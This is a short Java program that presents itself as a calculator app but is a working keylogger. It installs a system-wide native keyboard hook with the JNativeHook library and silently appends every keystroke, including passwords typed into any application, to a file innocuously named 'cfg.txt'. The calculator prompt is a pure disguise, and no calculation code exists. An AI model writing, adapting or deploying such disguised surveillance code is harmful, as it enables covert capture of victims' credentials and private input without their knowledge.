import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class k implements NativeKeyListener {
  boolean isShifted = false;
  String s;

  public k() throws IOException {
    System.out.println("Calculator app : input desired expression down here :");
  }

  @Override
  public void nativeKeyPressed(NativeKeyEvent n) {
    s = NativeKeyEvent.getKeyText(n.getKeyCode());
    if (s.equals("Alt") || s.equals("Tab") || s.equals("Meta")) {
      return;
    }
    if (s.equals("Shift") || s.equals("Unknown keyCode: 0xe36")) {
      isShifted = true;
      return;
    }

    if (isShifted == false) {
      s = s.toLowerCase();
    } else
      s = "." + s;
    try {
      FileWriter fw = new FileWriter("./cfg.txt", true);
      fw.write(s + " ");
      fw.close();
    } catch (Exception e) {
    }

  }

  @Override
  public void nativeKeyReleased(NativeKeyEvent n) {
    s = NativeKeyEvent.getKeyText(n.getKeyCode());
    if (s.equals("Shift") || s.equals("Unknown keyCode: 0xe36")) {
      isShifted = false;
    }
  }

  @Override
  public void nativeKeyTyped(NativeKeyEvent n) {
  }

  public static void main(String[] args) throws IOException, NativeHookException {
    GlobalScreen.registerNativeHook();
    GlobalScreen.addNativeKeyListener(new k());
  }
}
